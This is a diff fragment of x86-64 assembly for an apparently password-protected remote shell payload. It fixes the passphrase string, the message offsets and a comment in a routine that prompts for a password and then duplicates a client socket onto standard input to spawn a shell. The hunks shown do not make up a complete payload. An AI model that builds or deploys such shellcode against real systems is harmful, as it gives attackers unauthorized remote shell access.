@@ -12,7 +12,7 @@ _getref:	; Keep reference to strings
 _data:
 	call _getref		; call pushes RIP onto stack
 	prompt: db "Speak friend and enter: "
-	pass:	db "password", 0xa
+	pass:	db "password"
 	good:	db "Welcome", 0xa
 	bad:	db "Wrong", 0xa
 
@@ -122,14 +122,14 @@ _cmploop:
 	loop _cmploop		; next char
 
 ; good passphrase (fallthrough)
-	lea rsi, [r15+33]	; welcome string
+	lea rsi, [r15+32]	; welcome string
 	xor rdx, rdx
 	add rdx, 8		; welcome length
 	call _prompt
 	jmp _create_shell	; set up the shell
 
 _badpw:
-	lea rsi, [r15+41]	; fail message
+	lea rsi, [r15+40]	; fail message
 	xor rdx, rdx
 	add rdx, 6		; fail length
 	call _prompt
@@ -147,7 +147,7 @@ _create_shell:
 	xor rax, rax 
 	add rax, 33		; dup2		
 	mov r8, rax
-	mov rdi, [rbp-40]	; socket id
+	mov rdi, [rbp-40]	; client socket id
 	xor rsi, rsi		; STDIN
 	syscall 
 
